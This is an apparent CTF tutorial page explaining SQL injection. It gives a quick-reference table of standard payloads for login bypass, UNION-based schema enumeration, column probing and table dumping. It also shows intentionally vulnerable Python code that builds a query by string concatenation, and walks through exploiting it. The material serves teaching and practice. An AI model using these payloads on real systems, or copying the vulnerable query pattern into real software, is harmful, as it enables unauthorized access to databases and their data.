---
title: "SQL Injection"
description: "Exploit SQL injection vulnerabilities to manipulate database queries and extract sensitive information in CTF web challenges."
date: 2025-10-06
draft: false
categories: ["Web"]
tags: ["sqli", "sql injection", "database exploitation", "web security"]
authors: ["CTF.Support Team"]
summary: "Learn how SQL injection works and how to exploit improperly sanitized database queries to retrieve flags and data in CTFs."
aliases: ["/web/sql-injection/"]
slug: "sql-injection"
toc: true
---

## Introduction

**SQL Injection (SQLi)** occurs when user input is improperly concatenated into a SQL query, allowing direct control over its execution.
In CTFs, this often exposes login bypasses or flag tables within databases.

## Quick Reference

| Task                                      | Example                                                          |
|-------------------------------------------|------------------------------------------------------------------|
| Test for boolean login bypass             | `' OR 1=1 --`                                                    |
| Enumerate databases                       | `' UNION SELECT schema_name FROM information_schema.schemata --` |
| Identify columns via error-based strategy | `' ORDER BY 5 --`                                                |
| Dump table contents                       | `' UNION SELECT column1, column2 FROM users --`                  |

## Resources

| Resource                                                                                               | Description                                |
|--------------------------------------------------------------------------------------------------------|--------------------------------------------|
| [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection) | Comprehensive SQLi payloads and techniques |
| [HackTricks](https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html)                  | In-depth SQLi exploitation methods         |

## Example

### Vulnerable Code (Python)

```python
import sqlite3

def get_user(username):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    query = f"SELECT * FROM users WHERE username = '{username}'"
    cursor.execute(query)
    return cursor.fetchall()
```

#### Exploit

Inject input:

```sql
' OR 1=1 --
```

Resulting query:

```sql
SELECT * FROM users WHERE username = '' OR 1=1 --'
```

This returns all rows, granting unintended access.
